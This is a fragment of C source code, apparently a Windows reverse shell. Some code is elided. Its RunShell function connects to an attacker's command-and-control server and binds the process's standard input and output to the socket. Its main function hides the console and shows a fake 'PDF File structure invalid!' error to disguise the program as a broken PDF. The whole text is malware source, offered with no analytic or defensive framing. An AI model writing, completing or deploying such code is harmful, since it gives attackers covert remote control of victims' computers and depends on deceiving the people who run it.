...
void RunShell(char *C2Server, int C2Port)
{
        while (true) {
                ...
                mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
                ...
                if (WSAConnect(mySocket, (SOCKADDR *)&addr, sizeof(addr), NULL,
                        ...
                        if (RecvCode <= 0) {
                                ...
                                sinfo.hStdInput = sinfo.hStdOutput =
                                ...
                                memset(RecvData, 0, sizeof(RecvData));
                                int RecvCode = recv(mySocket, RecvData,
                                                    DEFAULT_BUFLEN, 0);
                                if (RecvCode <= 0) {
                                        closesocket(mySocket);
                                        WSACleanup();
...
int main(int argc, char **argv)
{
        ...
        FreeConsole();
        MessageBox(NULL, "PDF File structure invalid!", "PDF Reader Error",
                   MB_ICONERROR | MB_OK);
        if (argc == 3) {
